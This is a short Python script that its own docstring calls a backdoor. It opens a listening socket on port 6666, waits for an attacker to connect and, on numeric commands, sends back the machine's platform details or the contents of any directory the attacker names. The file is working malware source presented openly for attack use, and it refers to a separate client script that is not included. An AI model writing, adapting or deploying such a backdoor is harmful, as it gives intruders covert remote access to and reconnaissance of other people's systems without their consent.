import socket, platform, os 

"""
- requires backdoor_client.py
- creates a a backdoor on a target for an attacker to connect to
- executes enumeration options on a target for an attacker 
"""


srv_addr = ""
srv_port = 6666

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((srv_addr, srv_port))
s.listen(1)
conn, addr = s.accept()

while 1:
    try:
        data = conn.recv(1024)
    except:
        continue 

    if (data.decode('utf-8') == '1'):
        tosend = platform.platform() + " " + platform.machine()
        conn.sendall(tosend.encode())
    elif (data.decode('utf-8') == '2'):
        data = conn.recv(1024)
        try:
            filelist = os.listdir(data.decode('utf-8'))
            tosend = ""
            for i in filelist:
                tosend += "," + i
        except:
            tosend = "wrong path"
        
        conn.sendall(tosend.encode())

    elif (data.decode('utf-8') == '0'):
        conn.close()
        conn, addr = s.accept()